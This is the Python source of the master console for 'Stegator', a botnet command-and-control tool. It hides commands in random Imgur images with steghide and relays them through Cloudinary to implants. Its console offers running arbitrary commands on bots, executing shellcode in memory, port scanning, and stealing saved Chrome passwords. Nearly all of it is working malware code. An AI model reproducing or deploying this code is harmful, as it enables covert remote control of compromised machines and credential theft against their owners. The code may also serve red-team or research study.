#!/usr/bin/env python
# -*- coding: utf-8 -*-

__license__ = """

Stegator

Author: https://twitter.com/1_mod_m/

Project site: https://github.com/1modm/stegator

The MIT License (MIT)

Copyright (c) 2016 MM

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""


#------------------------------------------------------------------------------
# Modules
#------------------------------------------------------------------------------

import base64
import json
import random
import string
import time
import os
import sys
import subprocess
import tempfile
import urllib2
import platform
import shutil
from thirdparty.color.termcolor import colored
import cloudinary
from cloudinary.uploader import upload
from cloudinary.api import delete_resources_by_tag, resources_by_tag
from PIL import Image
import uuid


#------------------------------------------------------------------------------
# Data
#------------------------------------------------------------------------------

BOTS_ALIVE = []
COMMANDS = []
PASSPHRASEENTRY = "P&$$W0rd"
TEMPIMPLANTIMG = "implantoutput.jpg"
TEMPSTEGOIMG = "stegatoroutput.jpg"
DEFAULT_TAG = "cacafuti"


#------------------------------------------------------------------------------
# cloudinary authentication
#------------------------------------------------------------------------------

cloudinary.config( 
  cloud_name = "xxxxxxxxxxxx", 
  api_key = "xxxxxxxxxxxx", 
  api_secret = "xxxxxxxxxxxx" 
)


#------------------------------------------------------------------------------
# Class ImageHandle
#------------------------------------------------------------------------------

class ImageHandle():

    def get_img(self):

        try:
            imgur = "None"
            download_img = True

            print((colored('[+] Downloading image from Cloud Service...', 'white')))
            while download_img:
                
                # Remove not valid image downloaded 
                if (os.path.isfile(imgur)):
                    os.remove(imgur)

                imgur = ''.join(random.sample(string.letters+string.digits, 5)) + '.jpg'
                img = urllib2.urlopen("http://i.imgur.com/" + imgur).read()

                if len(img) != 503: # 'image not found' is 503 bytes
                    with open(os.path.join('./', imgur), "wb") as f:
                        f.write(img)

                    f.close()
                    
                    with Image.open(imgur) as im:
                        width, height = im.size

                    # Big enough to insert data
                    if (width > 400 and height > 400):
                        download_img = False

            return imgur
        except:
            print 'Get image error'
            if (os.path.isfile(imgur)):
                os.remove(imgur)



    def save(self, data, jobid):
        global DEFAULT_TAG
        global PASSPHRASEENTRY
        global TEMPSTEGOIMG

        steghideOutput = True
        srcpathimage = self.get_img()

        try:
            shutil.copy2(srcpathimage, TEMPSTEGOIMG)
            os.remove(srcpathimage)

            tmpdir = tempfile.mkdtemp()
            predictable_filename = 'tempfile'
            # Ensure the file is read/write by the creator only
            saved_umask = os.umask(0077)
            pathimplantoutput = os.path.join(tmpdir, predictable_filename)

            try:
                with open(pathimplantoutput, "w") as tmp:
                    tmp.write(str(data))
                    tmp.close()

                    process = subprocess.Popen(['steghide', 'embed', '-p', PASSPHRASEENTRY, '-q', '-f', '-ef', pathimplantoutput, '-cf', TEMPSTEGOIMG], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
                    out, err = process.communicate()
                    if out:
                        print out
                        if ("steghide:" in out):
                            # steghide error 
                            steghideOutput = False
                    if err:
                        print err

            except IOError as e:
                print 'IOError'
                os.remove(pathimplantoutput)
                os.umask(saved_umask)
                os.rmdir(tmpdir)
            else:
                os.remove(pathimplantoutput)
            finally:
                os.umask(saved_umask)
                os.rmdir(tmpdir)

        except:
            print((colored('[-] Error saving image', 'yellow')))
        
        # Upload img downloaded in cloud service
        if (os.path.isfile(TEMPSTEGOIMG) and steghideOutput):

            try:
                print((colored('[+] Uploaded image to Cloud Service', 'white')))
                jobidmaster = "master_" + jobid
                response = upload(TEMPSTEGOIMG,
                    tags = DEFAULT_TAG,
                    public_id = jobidmaster,
                )

            except:
                print((colored('[-] Cloud Service error', 'yellow')))
                return False
            finally:
                if (os.path.isfile(TEMPSTEGOIMG)):
                    os.remove(TEMPSTEGOIMG)
        else:
            return False

        return steghideOutput



    def load(self, urlimg):

        global DEFAULT_TAG
        global TEMPIMPLANTIMG
        global PASSPHRASEENTRY

        extractedmessage = ""

        img = urllib2.urlopen(urlimg).read()
        if len(img) != 503: # 'image not found' is 503 bytes
            with open(os.path.join('./', TEMPIMPLANTIMG), "wb") as f:
                f.write(img)
       

        if (os.path.isfile(TEMPIMPLANTIMG)):
    
            tmpdir = tempfile.mkdtemp()
            predictable_filename = 'tempfile'
            # Ensure the file is read/write by the creator only
            saved_umask = os.umask(0077)
            path = os.path.join(tmpdir, predictable_filename)
            try:
                with open(path, "w") as tmp:

                    process = subprocess.Popen(['steghide', 'extract', '-p', PASSPHRASEENTRY, '-q', '-f', '-xf', path, '-sf', TEMPIMPLANTIMG], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
                    
                    out, err = process.communicate()
                    if out:
                        print out
                    if err:
                        print err

                    tmp.close()
                    
                file = open(path, 'r')
                stegtext = file.read()
                # Added command to bots list
                extractedmessage = CommandOutput(stegtext)

            except IOError as e:
                print 'IOError'
            else:
                os.remove(path)
            finally:
                os.umask(saved_umask)
                os.rmdir(tmpdir)
                os.remove(TEMPIMPLANTIMG)

        return extractedmessage



#------------------------------------------------------------------------------
# Class CommandOutput: build Command to send
#------------------------------------------------------------------------------


class CommandOutput:

    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.output = data['output']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except Exception as e:
            print ('Error decoding message: %s' % e)

    def get_jobid(self):
        return self.jobid

    def get_sender(self):
        return self.sender

    def get_receiver(self):
        return self.receiver

    def get_cmd(self):
        return self.cmd

    def get_output(self):
        return self.output


#------------------------------------------------------------------------------
# Class CommandToSend: To send commands
#------------------------------------------------------------------------------

class CommandToSend:
    def __init__(self, sender, receiver, cmd):
        self.sender = sender
        self.receiver = receiver
        self.cmd = cmd
        self.jobid = ''.join(uuid.uuid4().hex)

    def build(self):
        cmd = {'sender': self.sender,
                'receiver': self.receiver,
                'cmd': self.cmd,
                'jobid': self.jobid}
        return base64.b64encode(json.dumps(cmd))

    def get_jobid(self):
        return self.jobid




#------------------------------------------------------------------------------
# Main
#------------------------------------------------------------------------------


def refresh(refresh_bots=True):
    global BOTS_ALIVE
    global COMMANDS
    global DEFAULT_TAG

    if refresh_bots:
        BOTS_ALIVE = []

        print((colored('[+] Sending command to retrieve alive bots', 'white')))

        cmd = CommandToSend('master', DEFAULT_TAG, 'PING')
        jobid = cmd.get_jobid()

        saveimg = ImageHandle()

        if (saveimg.save(cmd.build(), jobid)):
            print((colored('[+] Steganography applied, image saved' , 'white')))
        else:
            print((colored('[-] Error saving the image. Try again' , 'yellow')))
            return None
        
        print((colored('[+] Sleeping 10 secs to wait for bots' + os.linesep, 'yellow')))
        time.sleep(10)


    loadimg = ImageHandle()

    response = resources_by_tag(DEFAULT_TAG)
    get_response = response.get('resources', [])
    
    for key in sorted(get_response):
        img = urllib2.urlopen(key['url']).read()
        if len(img) != 503: # 'image not found' is 503 bytes
        
            public_id = key['public_id'] # JOBID

            if (public_id.startswith("implant_")):
                message = loadimg.load(key['url'])
                try:
                    if refresh_bots and message.get_jobid() == jobid:
                        BOTS_ALIVE.append(message)
                    else:
                        existcommand = False
                        for command in COMMANDS:
                            if (message.get_jobid() == command.get_jobid()):
                                existcommand = True
                        if not (existcommand):
                            COMMANDS.append(message)
                except:
                    pass

    if refresh_bots:
        list_bots()


def list_bots():
    if (len(BOTS_ALIVE) == 0):
        print((colored('[-] No bots alive' + os.linesep, 'red')))
        return

    for bot in BOTS_ALIVE:
        print((colored('Bot: %s %s' % (bot.get_sender(), bot.get_output()), 'green')))



def list_commands():
    if (len(COMMANDS) == 0):
        print((colored('[-] No commands loaded' + os.linesep, 'yellow')))
        return

    for command in COMMANDS:
        print((colored("%s: '%s' on %s" % (command.get_jobid(), command.get_cmd(), command.get_sender()), 'blue')))


def retrieve_command(id_command):
    refresh(False)
    for command in COMMANDS:
        if (command.get_jobid() == id_command):
            print "%s:\n%s" % (command.get_jobid(), command.get_output())
            return
    print((colored('[-] Not able to retrieve the output' + os.linesep, 'yellow')))


def help():
    helpcolor = "white"
    print(os.linesep)
    print((colored(' cleanup - Clean Cloud Service images', helpcolor)))
    print((colored(' refresh - Refresh C&C control and ping all bots', helpcolor)))
    print((colored(' bots - List active bots', helpcolor)))
    print((colored(' commands - List executed commands', helpcolor)))
    print((colored(' retrieve <jobid> - Retrieve jobid command', helpcolor)))
    print((colored(' cmd <MAC ADDRESS> command - Execute the command on the bot', helpcolor)))
    print((colored(' shellcode <MAC ADDRESS> shellcode - Load and execute shellcode in memory (Windows only)', helpcolor)))
    print((colored(' scanner <MAC ADDRESS> <IP>:<PORT> - Port scanner example: scanner 0:0:0:0 192.168.1.1:22,80,443', helpcolor)))
    print((colored(' chromepasswords <MAC ADDRESS> - Retrieve Chrome Passwords from bot (Windows only)', helpcolor)))
    print((colored(' help - Print this usage', helpcolor)))
    print((colored(' exit - Exit the client', helpcolor)))
    print(os.linesep)


def cleanup():
    try:
        global DEFAULT_TAG

        response = resources_by_tag(DEFAULT_TAG)
        count = len(response.get('resources', []))

        print((colored("[+] Deleting %d images from previous sessions..." % (count), "white")))

        if (count == 0):
            print((colored("[-] No images found", "white")))
            return
        
        delete_resources_by_tag(DEFAULT_TAG)

        print((colored("[+] Done", "white")))
    except:
        print((colored("[-] Error trying to remove previous images", "yellow")))


def main():
    # Remove previous images from cloud
    cleanup()

    help()

    while True:
        cmd_to_launch = raw_input('C&C console > ')

        if (cmd_to_launch == 'refresh'):
            refresh()
        elif (cmd_to_launch == 'bots'):
            list_bots()
        elif (cmd_to_launch == 'commands'):
            list_commands()
        elif (cmd_to_launch == 'help'):
            help()
        elif (cmd_to_launch == 'cleanup'):
            cleanup()
        elif (cmd_to_launch == 'exit'):
            sys.exit(0)
        else:
            cmd_to_launch = cmd_to_launch.split(' ')
            if (cmd_to_launch[0] == "cmd"):
                cmd = CommandToSend('master', cmd_to_launch[1], ' '.join(cmd_to_launch[2:]))
                saveimg = ImageHandle()

                if (saveimg.save(cmd.build(), cmd.get_jobid())):
                    print((colored('[+] Steganography applied, image saved' , 'white')))
                    print((colored("[+] Sent command %s with jobid: %s" % (' '.join(cmd_to_launch[2:]), cmd.get_jobid()), "white")))
                else:
                    print((colored('[-] Error saving the image. Try again' , 'yellow')))
        
            elif (cmd_to_launch[0] == "shellcode"):
                cmd = CommandToSend('master', cmd_to_launch[1], 'shellcode %s' % base64.b64encode(cmd_to_launch[2]))
                saveimg = ImageHandle()

                if (saveimg.save(cmd.build(), cmd.get_jobid())):
                    print((colored('[+] Steganography applied, image saved' , 'white')))
                    print((colored("[+] Sent shellcode with jobid: %s" % (cmd.get_jobid()), "white")))

                else:
                    print((colored('[-] Error saving the image. Try again' , 'yellow')))

            elif (cmd_to_launch[0] == "scanner"):
                cmd = CommandToSend('master', cmd_to_launch[1], 'scanner %s' % cmd_to_launch[2])
                saveimg = ImageHandle()

                if (saveimg.save(cmd.build(), cmd.get_jobid())):
                    print((colored('[+] Steganography applied, image saved' , 'white')))
                    print((colored("[+] Sent scanner with jobid: %s" % (cmd.get_jobid()), "white")))

                else:
                    print((colored('[-] Error saving the image. Try again' , 'yellow')))

            elif (cmd_to_launch[0] == "chromepasswords"):
                cmd = CommandToSend('master', cmd_to_launch[1], 'chromepasswords')
                saveimg = ImageHandle()

                if (saveimg.save(cmd.build(), cmd.get_jobid())):
                    print((colored('[+] Steganography applied, image saved' , 'white')))
                    print((colored("[+] Retrieve chrome passwords with jobid: %s" % (cmd.get_jobid()), "white")))

                else:
                    print((colored('[-] Error saving the image. Try again' , 'yellow')))


            elif (cmd_to_launch[0] == "retrieve"):
                retrieve_command(cmd_to_launch[1])
            else:
                print((colored("[!] Unrecognized command", "yellow")))

if __name__ == '__main__':
    main()
